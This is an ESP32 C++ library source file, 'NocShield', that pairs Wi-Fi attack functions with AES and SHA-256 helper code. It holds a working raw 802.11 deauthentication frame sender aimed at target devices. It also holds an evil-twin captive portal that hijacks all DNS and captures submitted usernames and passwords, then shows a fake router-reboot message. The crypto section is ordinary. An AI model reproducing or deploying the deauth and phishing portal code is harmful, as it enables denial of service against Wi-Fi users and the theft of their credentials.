#include "NocShield.h"
#include <new> // for std::nothrow, used to check heap allocations safely

NocShield::NocShield() : _isMonitoring(false), _dnsServer(nullptr), _webServer(nullptr), _portalHtml(nullptr) {
}

NocShield::~NocShield() {
    stopPacketMonitor();
    if (_dnsServer) {
        _dnsServer->stop();
        delete _dnsServer;
    }
    if (_webServer) {
        _webServer->stop();
        delete _webServer;
    }
}

void NocShield::begin() {
    WiFi.mode(WIFI_STA);
    WiFi.disconnect();
    delay(100);
}

bool NocShield::sendDeauth(uint8_t *targetMac, uint8_t *apMac, uint8_t channel, uint16_t reason) {
    uint8_t deauthFrame[26] = {
        0xC0, 0x00, 
        0x00, 0x00, 
        0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 
        0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 
        0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 
        0x00, 0x00, 
        0x01, 0x00  
    };

    for (int i = 0; i < 6; i++) {
        deauthFrame[4 + i]  = targetMac[i];
        deauthFrame[10 + i] = apMac[i];
        deauthFrame[16 + i] = apMac[i];
    }
    
    deauthFrame[24] = reason & 0xFF;
    deauthFrame[25] = (reason >> 8) & 0xFF;

    esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
    
    esp_err_t result = esp_wifi_80211_tx(WIFI_IF_STA, deauthFrame, sizeof(deauthFrame), false);
    
    return (result == ESP_OK);
}

void NocShield::startPacketMonitor(wifi_promiscuous_cb_t callback) {
    if (_isMonitoring) return;
    esp_wifi_set_promiscuous(true);
    esp_wifi_set_promiscuous_rx_cb(callback);
    _isMonitoring = true;
}

void NocShield::stopPacketMonitor() {
    if (!_isMonitoring) return;
    esp_wifi_set_promiscuous(false);
    esp_wifi_set_promiscuous_rx_cb(nullptr);
    _isMonitoring = false;
}

void NocShield::startCaptivePortal(const char* ssid, const char* htmlContent) {
    _portalHtml = htmlContent;
    WiFi.mode(WIFI_AP);
    WiFi.softAP(ssid);
    
    _dnsServer = new DNSServer();
    _webServer = new WebServer(80);
    
    _dnsServer->start(53, "*", WiFi.softAPIP());
    
    _webServer->on("/", [this]() {
        _webServer->send(200, "text/html", _portalHtml);
    });
    
    _webServer->onNotFound([this]() {
        _webServer->sendHeader("Location", String("http://") + WiFi.softAPIP().toString(), true);
        _webServer->send(302, "text/plain", "");
    });
    
    _webServer->on("/login", HTTP_POST, [this]() {
        String username = _webServer->arg("username");
        String password = _webServer->arg("password");
        
        Serial.println("\n--- [ALERT] CAPTURED CREDENTIALS ---");
        Serial.println("Username: " + username);
        Serial.println("Password: " + password);
        Serial.println("------------------------------------\n");
        
        String errorHtml = "<html><body><h2>Connection failed. The router is rebooting.</h2></body></html>";
        _webServer->send(200, "text/html", errorHtml);
    });
    
    _webServer->begin();
    Serial.println("Captive portal started!");
    Serial.print("SSID: "); Serial.println(ssid);
    Serial.print("IP Address: "); Serial.println(WiFi.softAPIP());
}

void NocShield::handleCaptivePortal() {
    if (_dnsServer) _dnsServer->processNextRequest();
    if (_webServer) _webServer->handleClient();
}

// ---------------- Cryptography ----------------

String NocShield::bytesToHex(const uint8_t* bytes, size_t length) {
    // BUG FIX: repeated String += causes multiple heap reallocations
    // (memory fragmentation risk on ESP32's small heap). Reserve the
    // final size up front so the buffer is only allocated once.
    String hexString;
    hexString.reserve(length * 2);
    for (size_t i = 0; i < length; i++) {
        if (bytes[i] < 16) hexString += "0";
        hexString += String(bytes[i], HEX);
    }
    return hexString;
}

bool NocShield::hexToBytes(const String& hex, uint8_t* bytes, size_t length) {
    // BUG FIX: previously there was no check that `hex` actually contains
    // enough characters for `length` bytes. A short/malformed hex string
    // silently produced garbage bytes instead of failing loudly.
    if (hex.length() < length * 2) {
        return false;
    }
    for (size_t i = 0; i < length; i++) {
        String byteString = hex.substring(i * 2, i * 2 + 2);
        bytes[i] = (uint8_t) strtol(byteString.c_str(), NULL, 16);
    }
    return true;
}

uint32_t NocShield::generateRandomNumber() {
    return esp_random();
}

String NocShield::hashSHA256(const String& payload) {
    byte shaResult[32];
    mbedtls_md_context_t ctx;
    mbedtls_md_type_t md_type = MBEDTLS_MD_SHA256;

    mbedtls_md_init(&ctx);

    // BUG FIX: mbedtls_md_setup()'s return value was previously ignored.
    // If setup fails (e.g. out of memory), `ctx` is left unusable and the
    // subsequent mbedtls_md_starts/update/finish calls would operate on
    // an invalid context (undefined behavior / crash). Fail safely instead.
    if (mbedtls_md_setup(&ctx, mbedtls_md_info_from_type(md_type), 0) != 0) {
        mbedtls_md_free(&ctx);
        return String();
    }

    mbedtls_md_starts(&ctx);
    mbedtls_md_update(&ctx, (const unsigned char *)payload.c_str(), payload.length());
    mbedtls_md_finish(&ctx, shaResult);
    mbedtls_md_free(&ctx);

    return bytesToHex(shaResult, 32);
}

String NocShield::encryptAES(const String& plaintext, const uint8_t* key, const uint8_t* iv) {
    mbedtls_aes_context aes;
    mbedtls_aes_init(&aes);

    // BUG FIX: mbedtls_aes_setkey_enc()'s return value was ignored. If the
    // key setup fails, the AES context is left invalid and crypt_cbc()
    // would operate on garbage state. Bail out cleanly instead.
    if (mbedtls_aes_setkey_enc(&aes, key, 256) != 0) { // Assuming 256-bit key
        mbedtls_aes_free(&aes);
        return String();
    }

    // PKCS#7 Padding
    size_t paddedLength = plaintext.length() + (16 - (plaintext.length() % 16));

    // BUG FIX: on most platforms plain `new` throws on failure, but ESP32's
    // Arduino core builds with C++ exceptions disabled, so a failed `new`
    // just returns nullptr instead of throwing. The original code never
    // checked for this, which meant a low-memory condition could silently
    // cause a null-pointer dereference a few lines later. Use std::nothrow
    // and check both allocations explicitly.
    uint8_t* paddedData = new (std::nothrow) uint8_t[paddedLength];
    uint8_t* output = new (std::nothrow) uint8_t[paddedLength];
    if (!paddedData || !output) {
        delete[] paddedData;
        delete[] output;
        mbedtls_aes_free(&aes);
        return String();
    }

    memcpy(paddedData, plaintext.c_str(), plaintext.length());

    uint8_t paddingValue = paddedLength - plaintext.length();
    for (size_t i = plaintext.length(); i < paddedLength; i++) {
        paddedData[i] = paddingValue;
    }

    uint8_t ivCopy[16];
    memcpy(ivCopy, iv, 16); // mbedtls modifies the IV!

    // BUG FIX: crypt_cbc()'s return value was ignored; only trust the
    // output buffer (and hex-encode it) if encryption actually succeeded.
    int cryptResult = mbedtls_aes_crypt_cbc(&aes, MBEDTLS_AES_ENCRYPT, paddedLength, ivCopy, paddedData, output);
    mbedtls_aes_free(&aes);

    String result;
    if (cryptResult == 0) {
        result = bytesToHex(output, paddedLength);
    }

    delete[] paddedData;
    delete[] output;

    return result;
}

String NocShield::decryptAES(const String& ciphertextHex, const uint8_t* key, const uint8_t* iv) {
    // BUG FIX (main issue): the original code computed
    //   output[ciphertextLength - 1]
    // with no check that ciphertextLength > 0. Since ciphertextLength is a
    // size_t (unsigned), an empty/odd-length hex string made this underflow
    // to SIZE_MAX, causing a wild out-of-bounds read (and, on the unpadding
    // loop, a huge unpaddedLength) -> crash / memory corruption.
    if (ciphertextHex.length() == 0 || (ciphertextHex.length() % 2) != 0) {
        return String();
    }

    size_t ciphertextLength = ciphertextHex.length() / 2;

    // BUG FIX: AES-CBC operates on whole 16-byte blocks. A ciphertext
    // whose length isn't a multiple of the block size is malformed input;
    // feeding it to mbedtls_aes_crypt_cbc() is undefined behavior.
    if (ciphertextLength == 0 || (ciphertextLength % 16) != 0) {
        return String();
    }

    uint8_t* cipherData = new (std::nothrow) uint8_t[ciphertextLength];
    uint8_t* output = new (std::nothrow) uint8_t[ciphertextLength];
    if (!cipherData || !output) {
        delete[] cipherData;
        delete[] output;
        return String();
    }

    if (!hexToBytes(ciphertextHex, cipherData, ciphertextLength)) {
        delete[] cipherData;
        delete[] output;
        return String();
    }

    mbedtls_aes_context aes;
    mbedtls_aes_init(&aes);

    if (mbedtls_aes_setkey_dec(&aes, key, 256) != 0) { // Assuming 256-bit key
        mbedtls_aes_free(&aes);
        delete[] cipherData;
        delete[] output;
        return String();
    }

    uint8_t ivCopy[16];
    memcpy(ivCopy, iv, 16); // mbedtls modifies the IV!

    int cryptResult = mbedtls_aes_crypt_cbc(&aes, MBEDTLS_AES_DECRYPT, ciphertextLength, ivCopy, cipherData, output);
    mbedtls_aes_free(&aes);

    String result;
    if (cryptResult == 0) {
        // PKCS#7 Unpadding
        uint8_t paddingValue = output[ciphertextLength - 1]; // safe: ciphertextLength >= 16 here
        // BUG FIX: also verify paddingValue does not exceed the buffer
        // length (a corrupted/wrong-key decryption can produce any byte
        // value here); otherwise unpaddedLength would underflow again.
        if (paddingValue > 0 && paddingValue <= 16 && paddingValue <= ciphertextLength) {
            size_t unpaddedLength = ciphertextLength - paddingValue;
            // BUG FIX: build the String in one shot instead of appending
            // one character at a time (which repeatedly reallocates and
            // fragments the heap on ESP32).
            result.reserve(unpaddedLength);
            for (size_t i = 0; i < unpaddedLength; i++) {
                result += (char)output[i];
            }
        }
    }

    delete[] cipherData;
    delete[] output;

    return result;
}